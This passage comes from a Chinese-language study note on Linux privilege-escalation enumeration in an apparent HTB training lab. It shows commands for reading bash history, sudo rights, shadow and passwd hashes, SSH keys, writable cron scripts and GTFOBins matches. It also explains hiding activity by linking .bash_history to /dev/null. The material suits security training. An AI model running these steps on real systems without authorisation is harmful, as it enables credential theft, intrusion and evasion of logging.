pts/0    R+   23:30   0:00 ps au</code></pre><h4 id="Home-Directory-Contents"><a href="#Home-Directory-Contents" class="headerlink" title="Home Directory Contents"></a>Home Directory Contents</h4><h4 id="Home-Directory-Contents-1"><a href="#Home-Directory-Contents-1" class="headerlink" title="Home Directory Contents"></a>Home Directory Contents</h4><p>我们可以检查各个用户目录，检查诸如.bash_history文件之类的文件是否可读并包含任何有趣的命令，查找配置文件，并检查是否可以获得用户SSH密钥的副本。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /home/stacey.jenkins/total 32drwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .drwxr-xr-x 9 root           root           4096 Aug 30 23:33 ..-rw------- 1 stacey.jenkins stacey.jenkins   41 Aug 30 23:35 .bash_history-rw-r--r-- 1 stacey.jenkins stacey.jenkins  220 Sep  1  2015 .bash_logout-rw-r--r-- 1 stacey.jenkins stacey.jenkins 3771 Sep  1  2015 .bashrc-rw-r--r-- 1 stacey.jenkins stacey.jenkins   97 Aug 30 23:37 config.json-rw-r--r-- 1 stacey.jenkins stacey.jenkins  655 May 16  2017 .profiledrwx------ 2 stacey.jenkins stacey.jenkins 4096 Aug 30 23:35 .ssh</code></pre><p>如果找到当前用户的SSH密钥，则可以使用该密钥在主机上打开SSH会话（如果SSH在外部公开），并获得稳定且完全交互的会话。SSH密钥也可以用来访问网络中的其他系统。至少，检查ARP缓存以查看正在访问的其他主机，并将这些主机与任何可用的SSH私钥进行交叉引用。</p><h4 id="Bash-History"><a href="#Bash-History" class="headerlink" title="Bash History"></a>Bash History</h4><pre><code class="shell-session">Tanin@htb[/htb]$ history    1  id    2  cd /home/cliff.moore    3  exit    4  touch backup.sh    5  tail /var/log/apache2/error.log    6  ssh ec2-user@dmz02.inlanefreight.local    7  history</code></pre><p>Sudo特权：用户可以以其他用户或root用户的身份运行任何命令吗？如果您没有用户的凭据，则可能无法利用sudo权限。然而，sudoer条目通常包括NOPASSWD，这意味着用户可以在不提示输入密码的情况下运行指定的命令。并非所有命令，即使我们可以以root身份运行，也会导致权限提升。以拥有完全sudo权限的用户身份获得访问权限并不罕见，这意味着他们可以以root用户身份运行任何命令。发出一个简单的sudo-su命令将立即为您提供一个根会话。</p><h4 id="Sudo-List-User’s-Privileges"><a href="#Sudo-List-User’s-Privileges" class="headerlink" title="Sudo - List User’s Privileges"></a>Sudo - List User’s Privileges</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo -lMatching Defaults entries for sysadm on NIX02:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser sysadm may run the following commands on NIX02:    (root) NOPASSWD: /usr/sbin/tcpdump</code></pre><p>配置文件：配置文件可以保存丰富的信息。值得在所有以.conf和.config等扩展名结尾的文件中搜索用户名、密码和其他机密。 </p><p>Shadow File：如果Shadow File是可读的，您将能够为所有设置了密码的用户收集密码哈希。虽然这不能保证进一步的访问，但这些哈希可能会受到离线暴力攻击，以恢复明文密码。</p><p> &#x2F;etc&#x2F;passwd中的密码哈希：偶尔，您会直接在&#x2F;etc&#x2F;passwd文件中看到密码哈希。该文件对所有用户都是可读的，与Shadow File中的哈希一样，这些用户可能会受到离线密码破解攻击。这种配置虽然不常见，但有时可以在嵌入式设备和路由器上看到。</p><p>Cron Jobs：Linux系统上的Cron作业类似于Windows计划任务。它们通常用于执行维护和备份任务。结合其他错误配置（如相对路径或弱权限），它们可以在计划的cron作业运行时利用这些错误配置来提升权限。</p><h4 id="Cron-Jobs"><a href="#Cron-Jobs" class="headerlink" title="Cron Jobs"></a>Cron Jobs</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /etc/cron.daily/total 60drwxr-xr-x  2 root root 4096 Aug 30 23:49 .drwxr-xr-x 93 root root 4096 Aug 30 23:47 ..-rwxr-xr-x  1 root root  376 Mar 31  2016 apport-rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat-rwx--x--x  1 root root  379 Aug 30 23:49 backup-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg-rwxr-xr-x  1 root root  372 May  6  2015 logrotate-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common</code></pre><h4 id="File-Systems-amp-Additional-Drives"><a href="#File-Systems-amp-Additional-Drives" class="headerlink" title="File Systems &amp; Additional Drives"></a>File Systems &amp; Additional Drives</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lsblkNAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTsda      8:0    0   30G  0 disk ├─sda1   8:1    0   29G  0 part /├─sda2   8:2    0    1K  0 part └─sda5   8:5    0  975M  0 part [SWAP]sr0     11:0    1  848M  0 rom  </code></pre><p>SETUID和SETGID权限：二进制文件设置有这些权限，允许用户以root身份运行命令，而无需向用户授予root级别的访问权限。许多二进制文件包含可以用来获取根shell的功能。 </p><p>可写目录：如果您需要将工具下载到系统中，那么发现哪些目录是可写的非常重要。您可能会发现cron jobs放置文件的可写目录，该目录提供了cron作业运行频率的概念，如果cron jobs所运行的脚本也是可写的，则可用于提升权限。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null/dmz-backups/tmp/tmp/VMwareDnD/tmp/.XIM-unix/tmp/.Test-unix/tmp/.X11-unix/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp/tmp/.font-unix/tmp/.ICE-unix/proc/dev/mqueue/dev/shm/var/tmp/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp/var/crash/run/lock</code></pre><blockquote><p>该命令用于在Linux系统中查找具有写权限的目录。下面是对该命令的解释：</p><ul><li><p><code>find</code>：查找命令。</p></li><li><p><code>/</code>：指定要在根目录下开始查找。</p></li><li><p><code>-path /proc -prune</code>：排除路径为<code>/proc</code>的目录。</p></li><li><p><code>-o</code>：逻辑运算符，表示或者。</p></li><li><p><code>-type d</code>：指定查找的对象类型为目录。</p></li><li><p><code>-perm -o+w</code>：指定查找的目录具有其他用户写权限。</p></li><li><p><code>2&gt;/dev/null</code>：将错误输出重定向到<code>/dev/null</code>，以忽略任何权限错误信息。</p></li><li><p>在查找具有写权限的目录时，可以使用 <code>-perm -o+w</code> 来指定条件。该选项的含义是：</p><ul><li><code>-perm</code>：用于指定文件和目录权限的匹配条件。</li><li><code>-o</code>：表示其他用户权限组。</li><li><code>+w</code>：表示具有写权限。</li></ul><p>因此，<code>-perm -o+w</code> 表示查找具有其他用户组可写权限的文件和目录。</p></li></ul></blockquote><p>可写文件：任何脚本或配置文件都是可写的吗？虽然更改配置文件可能具有极大的破坏性，但在某些情况下，轻微的修改可能会打开进一步的访问权限。此外，任何使用cron jobs以root身份运行的脚本都可以稍作修改以附加命令。</p><h4 id="Find-Writable-Files"><a href="#Find-Writable-Files" class="headerlink" title="Find Writable Files"></a>Find Writable Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null/etc/cron.daily/backup/dmz-backups/backup.sh/proc/sys/fs/cgroup/memory/init.scope/cgroup.event_control&lt;SNIP&gt;/home/backupsvc/backup.sh&lt;SNIP&gt;</code></pre><h2 id="Gaining-Situational-Awareness"><a href="#Gaining-Situational-Awareness" class="headerlink" title="Gaining Situational Awareness"></a>Gaining Situational Awareness</h2><p>通常，我们需要运行一些基本命令来确定自己的方向：</p><ul><li><code>whoami</code> - what user are we running as</li><li><code>id</code> - what groups does our user belong to?</li><li><code>hostname</code> - what is the server named. can we gather anything from the naming convention?</li><li><code>ifconfig</code> or <code>ip -a</code> - what subnet did we land in, does the host have additional NICs in other subnets?</li><li><code>sudo -l</code> - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like <code>sudo su</code> and drop right into a root shell.</li><li>&#x2F;etc&#x2F;os-release</li></ul><p>接下来，我们将检查当前用户的PATH，每当为任何可执行文件执行命令以匹配我们键入的名称时，Linux系统都会在其中查找，即，该系统上位于&#x2F;usr&#x2F;bin&#x2F;id的id。正如我们稍后在本模块中看到的，如果目标用户的PATH变量配置错误，我们可能可以利用它来提升权限。</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre><p>我们还可以检查为当前用户设置的所有环境变量，我们可能会幸运地在其中找到一些敏感的东西，例如密码。</p><pre><code class="shell-session">Tanin@htb[/htb]$ envSHELL=/bin/bashPWD=/home/htb-studentLOGNAME=htb-studentXDG_SESSION_TYPE=ttyMOTD_SHOWN=pamHOME=/home/htb-studentLANG=en_US.UTF-8&lt;SNIP&gt;</code></pre><p>接下来让我们记下内核版本。我们可以进行一些搜索，看看目标是否正在运行一个易受攻击的内核（我们稍后将在模块中利用它），该内核具有一些已知的公共漏洞PoC。我们可以用几种方法来实现，另一种方法是&#x3D;&#x3D;cat&#x2F;proc&#x2F;version&#x3D;&#x3D;，但我们将使用uname-a命令。</p><pre><code class="shell-session">Tanin@htb[/htb]$ uname -aLinux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>接下来，我们可以收集一些关于主机本身的附加信息，例如CPU类型&#x2F;版本：</p><pre><code class="shell-session">Tanin@htb[/htb]$ lscpu Architecture:                    x86_64CPU op-mode(s):                  32-bit, 64-bitByte Order:                      Little EndianAddress sizes:                   43 bits physical, 48 bits virtualCPU(s):                          2On-line CPU(s) list:             0,1Thread(s) per core:              1Core(s) per socket:              2Socket(s):                       1NUMA node(s):                    1Vendor ID:                       AuthenticAMDCPU family:                      23Model:                           49Model name:                      AMD EPYC 7302P 16-Core ProcessorStepping:                        0CPU MHz:                         2994.375BogoMIPS:                        5988.75Hypervisor vendor:               VMware&lt;SNIP&gt;</code></pre><p>服务器上存在哪些登录shell？记下这些，并强调Tmux和Screen对我们都可用。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/shells# /etc/shells: valid login shells/bin/sh/bin/bash/usr/bin/bash/bin/rbash/usr/bin/rbash/bin/dash/usr/bin/dash/usr/bin/tmux/usr/bin/screen</code></pre><p>我们还应该检查是否有任何防御措施，我们可以列举有关它们的任何信息。需要查找的内容包括：</p><ul><li><a href="https://en.wikipedia.org/wiki/Exec_Shield">Exec Shield</a></li><li><a href="https://linux.die.net/man/8/iptables">iptables</a></li><li><a href="https://apparmor.net/">AppArmor</a></li><li><a href="https://www.redhat.com/en/topics/linux/what-is-selinux">SELinux</a></li><li><a href="https://github.com/fail2ban/fail2ban">Fail2ban</a></li><li><a href="https://www.snort.org/faq/what-is-snort">Snort</a></li><li><a href="https://wiki.ubuntu.com/UncomplicatedFirewall">Uncomplicated Firewall (ufw)</a></li></ul><p>通常情况下，我们没有特权列举这些保护的配置，但知道哪些配置（如果有的话）可以帮助我们避免在某些任务上浪费时间。 接下来，我们可以查看系统上的驱动器和任何共享。首先，我们可以使用lsblk命令枚举系统上块设备（硬盘、USB驱动器、光盘驱动器等）的信息。如果我们发现并可以装载额外的驱动器或未装载的文件系统，我们可能会发现可以用来提升特权的敏感文件、密码或备份。</p><pre><code class="shell-session">Tanin@htb[/htb]$ lsblkNAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTloop0                       7:0    0   55M  1 loop /snap/core18/1705loop1                       7:1    0   69M  1 loop /snap/lxd/14804loop2                       7:2    0   47M  1 loop /snap/snapd/16292loop3                       7:3    0  103M  1 loop /snap/lxd/23339loop4                       7:4    0   62M  1 loop /snap/core20/1587loop5                       7:5    0 55.6M  1 loop /snap/core18/2538sda                         8:0    0   20G  0 disk ├─sda1                      8:1    0    1M  0 part ├─sda2                      8:2    0    1G  0 part /boot└─sda3                      8:3    0   19G  0 part   └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /sr0                        11:0    1  908M  0 rom </code></pre><p>命令lpstat可用于查找有关连接到系统的任何打印机的信息。如果有活动或排队的打印作业，我们是否可以访问某种敏感信息？<br>我们还应该检查已安装的驱动器和未安装的驱动器。我们可以安装一个死驱动器并访问敏感数据吗？通过在&#x2F;etc&#x2F;fstab中查找密码、用户名、凭据等常用词，我们能在fstab中为已安装的驱动器找到任何类型的凭据吗？</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/fstab# /etc/fstab: static file system information.## Use &#39;blkid&#39; to print the universally unique identifier for a# device; this may be used with UUID= as a more robust way to name devices# that works even if disks are added and removed. See fstab(5).## &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0# /boot was on /dev/sda2 during curtin installation/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0</code></pre><p>键入route或netstat-rn查看路由表。在这里，我们可以看到通过哪个接口可以使用哪些其他网络。</p><pre><code class="shell-session">Tanin@htb[/htb]$ routeKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Ifacedefault         _gateway        0.0.0.0         UG    0      0        0 ens19210.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192</code></pre><p>在域环境中，如果主机配置为使用内部DNS，我们肯定要检查&#x2F;etc&#x2F;resolv.conf。我们可以将其作为查询Active Directory环境的起点。 我们还想检查arp表，看看目标一直在与哪些其他主机通信。</p><pre><code class="shell-session">Tanin@htb[/htb]$ arp -a_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192</code></pre><p>偶尔，我们会在&#x2F;etc&#x2F;passwd文件中直接看到密码散列。该文件对所有用户都是可读的，与&#x2F;etc&#x2F;shadow文件中的哈希一样，这些用户可能会受到离线密码破解攻击。这种配置虽然不常见，但有时可以在嵌入式设备和路由器上看到。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/passwd | cut -f1 -d:rootdaemonbinsys</code></pre><p>Linux系统中的每个用户都被分配到一个或多个特定的组，从而获得特殊权限。例如，如果我们有一个名为dev的文件夹仅供开发人员使用，则必须将用户分配到适当的组以访问该文件夹。有关可用组的信息可以在&#x2F;etc&#x2F;group文件中找到，该文件向我们显示了组名和分配的用户名。</p><h4 id="Existing-Groups"><a href="#Existing-Groups" class="headerlink" title="Existing Groups"></a>Existing Groups</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/grouproot:x:0:daemon:x:1:bin:x:2:sys:x:3:...</code></pre><p>&#x2F;etc&#x2F;group文件列出了系统上的所有组。然后，我们可以使用 <a href="https://man7.org/linux/man-pages/man1/getent.1.html">getent</a> 命令列出任何感兴趣的组的成员。</p><pre><code class="shell-session">Tanin@htb[/htb]$ getent group sudosudo:x:27:mrb3n</code></pre><h4 id="Mounted-File-Systems"><a href="#Mounted-File-Systems" class="headerlink" title="Mounted File Systems"></a>Mounted File Systems</h4><p>卸载文件系统后，系统将无法再访问该文件系统。这可能是由于各种原因造成的，例如删除磁盘或不再需要文件系统时。另一个原因可能是文件、脚本、文档和其他重要信息不能由标准用户装载和查看。因此，如果我们能够将权限扩展到根用户，我们就可以自己装载和读取这些文件系统。可以按如下方式查看未装载的文件系统：</p><pre><code class="shell-session">Tanin@htb[/htb]$ df -hFilesystem      Size  Used Avail Use% Mounted onudev            1,9G     0  1,9G   0% /devtmpfs           389M  1,8M  388M   1% /run/dev/sda5        20G  7,9G   11G  44% /</code></pre><h4 id="Unmounted-File-Systems"><a href="#Unmounted-File-Systems" class="headerlink" title="Unmounted File Systems"></a>Unmounted File Systems</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/fstab | grep -v &quot;#&quot; | column -tUUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1/swapfile                                  none       swap  sw                 0  0</code></pre><p>许多文件夹和文件在Linux系统中被隐藏，因此它们不明显，并且可以防止意外编辑。为什么这些文件和文件夹被隐藏起来，原因比迄今为止提到的要多得多。尽管如此，我们需要能够找到所有隐藏的文件和文件夹，因为它们通常包含敏感信息，即使我们拥有只读权限。</p><h4 id="All-Hidden-Files"><a href="#All-Hidden-Files" class="headerlink" title="All Hidden Files"></a>All Hidden Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f -name &quot;.*&quot; -exec ls -l &#123;&#125; \; 2&gt;/dev/null | grep htb-student-rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc-rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history</code></pre><blockquote><ul><li><code>&#123;&#125;</code> 表示 <code>find</code> 命令的占位符，用于表示找到的文件。</li><li><code>\;</code> 是 <code>find</code> 命令的结束符号，表示命令结束。</li></ul><p>通过这个命令，<code>find</code> 命令将在当前目录或指定的目录下查找满足条件的文件，并将每个文件的详细信息传递给 <code>ls -l</code> 命令进行输出。</p><p>需要注意的是，这个命令在每找到一个文件时都会执行一次 <code>ls -l</code> 命令，可能会产生大量的输出。如果您只想查看文件的总体信息，可以使用 <code>ls -l</code> 命令来替代。</p></blockquote><p>此外，三个默认文件夹用于临时文件。这些文件夹对所有用户都可见，并且可以读取。此外，可以在那里找到临时日志或脚本输出。&#x2F;tmp和&#x2F;var&#x2F;tmp都用于临时存储数据。然而，关键的区别在于数据在这些文件系统中存储的时间。&#x2F;var&#x2F;tmp的数据保留时间要比&#x2F;tmp目录的数据保持时间长得多。默认情况下，存储在&#x2F;var&#x2F;tmp中的所有文件和数据最多保留30天。另一方面，在&#x2F;tmp中，数据会在十天后自动删除。 此外，当系统重新启动时，存储在&#x2F;tmp目录中的所有临时文件都会立即删除。因此，程序使用&#x2F;var&#x2F;tmp目录来存储在重新启动之间必须临时保存的数据。</p><h4 id="Temporary-Files"><a href="#Temporary-Files" class="headerlink" title="Temporary Files"></a>Temporary Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.</p></blockquote><p>在查找时发现一个有趣的东西记录一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151702324.png" alt="image-20230715170245465">他把历史记录的文件直接软连接到null中，这样就可以不记录我们的操作。</p><blockquote><p>该输出显示了一个名为 <code>.bash_history</code> 的符号链接文件。下面是对该输出的解释：</p><ul><li><code>lrwxrwxrwx</code>：表示该文件是一个符号链接（即软链接）。第一个字符 <code>l</code> 表示文件类型为符号链接。</li><li><code>1</code>：表示链接计数，即有多少个文件名链接到同一个 inode（索引节点）。</li><li><code>root</code>：表示文件的所有者是 root 用户。</li><li><code>root</code>：表示文件的所属组是 root 组。</li><li><code>9 Jun 14 14:38</code>：表示文件的最后修改时间为 6 月 14 日的 14:38。</li><li><code>.bash_history -&gt; /dev/null</code>：表示 <code>.bash_history</code> 是一个指向 <code>/dev/null</code> 的符号链接。</li></ul><p>符号链接（或软链接）是一种特殊的文件类型，它创建了一个指向另一个文件或目录的引用。在这种情况下，<code>.bash_history</code> 是一个指向 <code>/dev/null</code> 的符号链接。<code>/dev/null</code> 是一个特殊的设备文件，它被用于丢弃所有写入它的数据，即将数据发送到空虚。</p><p>这种设置可能意味着用户的 Bash 历史记录文件被重定向到 <code>/dev/null</code>，这意味着 Bash 历史记录中的所有命令都将被丢弃，不会被保留下来。</p></blockquote><blockquote><p>要创建符号链接（软链接），可以使用 <code>ln</code> 命令。<code>ln</code> 命令用于创建链接，它可以创建硬链接或符号链接。在这种情况下，我们想要创建一个符号链接。</p><p>下面是使用 <code>ln</code> 命令创建符号链接的语法：</p><pre><code class="shell">ln -s &lt;目标文件&gt; &lt;链接名称&gt;</code></pre><p>其中：</p><ul><li><code>&lt;目标文件&gt;</code> 是指向的目标文件或目录的路径。</li><li><code>&lt;链接名称&gt;</code> 是要创建的符号链接的名称和路径。</li></ul><p>例如，要创建一个名为 <code>.bash_history</code> 的符号链接指向 <code>/dev/null</code>，可以使用以下命令：</p><pre><code class="shell">ln -s /dev/null .bash_history</code></pre><p>执行此命令后，将在当前目录中创建一个名为 <code>.bash_history</code> 的符号链接，它将指向 <code>/dev/null</code>。这样，当您的系统尝试将 Bash 历史记录写入 <code>.bash_history</code> 文件时，数据实际上会被重定向到 <code>/dev/null</code>，即被丢弃。</p><p>请注意，在创建符号链接时，确保您具有适当的权限来访问目标文件或目录，并且在目标文件或目录存在的情况下才能成功创建链接。</p></blockquote><h1 id="Linux-Services-amp-Internals-Enumeration"><a href="#Linux-Services-amp-Internals-Enumeration" class="headerlink" title="Linux Services &amp; Internals Enumeration"></a>Linux Services &amp; Internals Enumeration</h1><h2 id="Internals"><a href="#Internals" class="headerlink" title="Internals"></a>Internals</h2><p>当我们谈论内部时，我们指的是内部配置和工作方式，包括为完成特定任务而设计的集成流程。因此，我们从我们的目标系统可以通信的接口开始。</p><h4 id="Network-Interfaces"><a href="#Network-Interfaces" class="headerlink" title="Network Interfaces"></a>Network Interfaces</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ip a</code></pre><p>&#x2F;etc&#x2F;hosts文件中有什么有趣的内容吗？</p><p>查看每个用户的上次登录时间也很有帮助，以了解用户通常何时登录系统以及登录频率。这可以让我们了解这个系统的使用范围，这可能会导致更多的错误配置或“混乱”的目录或命令历史记录。</p><h4 id="User’s-Last-Login"><a href="#User’s-Last-Login" class="headerlink" title="User’s Last Login"></a>User’s Last Login</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lastlog</code></pre><p>此外，让我们看看目前是否有其他人与我们一起使用该系统。有几种方法可以做到这一点，例如who命令。finger命令将在某些Linux系统上显示此信息。我们可以看到cliff.moore用户已经和我们一起登录到了系统。</p><h4 id="Logged-In-Users"><a href="#Logged-In-Users" class="headerlink" title="Logged In Users"></a>Logged In Users</h4><pre><code class="shell-session">Tanin@htb[/htb]$ w 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATcliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash</code></pre><p>检查用户的bash历史记录也很重要，因为他们可能会在命令行上将密码作为参数传递，使用git存储库，设置cron作业等等。查看用户所做的事情可以让您深入了解所登录的服务器类型，并提示权限提升路径。</p><h4 id="Command-History"><a href="#Command-History" class="headerlink" title="Command History"></a>Command History</h4><pre><code class="shell-session">Tanin@htb[/htb]$ history    1  id    2  cd /home/cliff.moore    3  exit    4  touch backup.sh    5  tail /var/log/apache2/error.log    6  ssh ec2-user@dmz02.inlanefreight.local    7  history</code></pre><p>有时我们还可以找到由脚本或程序创建的特殊历史文件。这可以在监视用户的某些活动并检查可疑活动的脚本中找到。</p><h4 id="Finding-History-Files"><a href="#Finding-History-Files" class="headerlink" title="Finding History Files"></a>Finding History Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history</code></pre><p>检查系统上的任何cron作业也是一个好主意。Linux系统上的Cron作业类似于Windows计划任务。它们通常用于执行维护和备份任务。结合其他错误配置（如相对路径或弱权限），它们可以在计划的cron作业运行时利用这些错误配置来提升权限。</p><h4 id="Cron"><a href="#Cron" class="headerlink" title="Cron"></a>Cron</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /etc/cron.daily/</code></pre><p>proc文件系统 <a href="https://man7.org/linux/man-pages/man5/proc.5.html">proc filesystem</a> （proc&#x2F;procfs）是Linux中的一个特定文件系统，它包含有关系统进程、硬件和其他系统信息的信息。它是访问进程信息的主要方式，可用于查看和修改内核设置。它是虚拟的，不作为真实的文件系统存在，而是由内核动态生成的。它可以用来查找系统信息，例如运行进程的状态、内核参数、系统内存和设备。它还设置某些系统参数，例如进程优先级、调度和内存分配。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find /proc -name cmdline -exec cat &#123;&#125; \; 2&gt;/dev/null | tr &quot; &quot; &quot;\n&quot;...SNIP...startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:htb-student[priv]sshd:htb-student[priv]/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.ssh/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.sshsshd:htb-student@pts/2sshd:</code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><p>如果是稍旧的Linux系统，我们可能会发现安装的软件包中至少有一个漏洞。然而，当前版本的Linux发行版也可能安装了可能存在此类漏洞的旧包或软件。因此，我们将看到一种方法来帮助我们检测潜在的危险包裹。要做到这一点，我们首先需要创建一个要使用的已安装包的列表。</p><h4 id="Installed-Packages"><a href="#Installed-Packages" class="headerlink" title="Installed Packages"></a>Installed Packages</h4><pre><code class="shell-session">Tanin@htb[/htb]$ apt list --installed | tr &quot;/&quot; &quot; &quot; | cut -d&quot; &quot; -f1,3 | sed &#39;s/[0-9]://g&#39; | tee -a installed_pkgs.listListing...                                                 accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          accountsservice 0.6.55-0ubuntu12~20.04.5                   acl 2.2.53-6                                               acpi-support 0.143                                         acpid 2.0.32-1ubuntu1                                      adduser 3.118ubuntu2                                       adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 alsa-base 1.0.25+dfsg-0ubuntu5                             alsa-topology-conf 1.2.2-1                                                                                            alsa-ucm-conf 1.2.2-1ubuntu0.13                            alsa-utils 1.2.2-1ubuntu2.1                                                                                           amd64-microcode 3.20191218.1ubuntu1anacron 2.3-29apg 2.2.3.dfsg.1-5app-install-data-partner 19.04apparmor 2.13.3-7ubuntu5.1apport-gtk 2.20.11-0ubuntu27.24apport-symptoms 0.23apport 2.20.11-0ubuntu27.24appstream 0.12.10-2apt-config-icons-hidpi 0.12.10-2apt-config-icons 0.12.10-2apt-utils 2.0.9...SNIP...</code></pre><p>检查系统上安装的sudo版本是否容易受到任何遗留或最近的漏洞攻击也是一个好主意。</p><h4 id="Sudo-Version"><a href="#Sudo-Version" class="headerlink" title="Sudo Version"></a>Sudo Version</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo -V</code></pre><p>偶尔也会发生这样的情况：系统上没有安装直接包，而是以二进制文件的形式编译程序。这些不需要安装，并且可以由系统本身直接执行。</p><h4 id="Binaries"><a href="#Binaries" class="headerlink" title="Binaries"></a>Binaries</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -&gt; usr/bin/usr/bin/:total 175160-rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled-rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec-rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect-rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen-rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository-rwxr-xr-x 1 root root       30952 Feb  7  2022  addpartlrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -&gt; x86_64-linux-gnu-addr2line...SNIP...</code></pre><p><a href="https://gtfobins.github.io/">GTFObins</a>提供了一个优秀的平台，其中包括一系列二进制文件，这些二进制文件可能被用来提升我们在目标系统上的权限。对于下一个oneliner，我们可以将现有的二进制文件与GTFObins中的二进制文件进行比较，以了解我们稍后应该研究哪些二进制文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d&quot; &quot; -f1 | sed &#39;/^[[:space:]]*$/d&#39;);do if grep -q &quot;$i&quot; installed_pkgs.list;then echo &quot;Check GTFO for: $i&quot;;fi;doneCheck GTFO for: ab                                         Check GTFO for: apt                                        Check GTFO for: ar                                         Check GTFO for: as         Check GTFO for: ash                                        Check GTFO for: aspell                                     Check GTFO for: at     Check GTFO for: awk      Check GTFO for: bash                                       Check GTFO for: bridgeCheck GTFO for: busyboxCheck GTFO for: bzip2Check GTFO for: catCheck GTFO for: commCheck GTFO for: cpCheck GTFO for: cpioCheck GTFO for: cupsfilterCheck GTFO for: curlCheck GTFO for: dashCheck GTFO for: dateCheck GTFO for: ddCheck GTFO for: 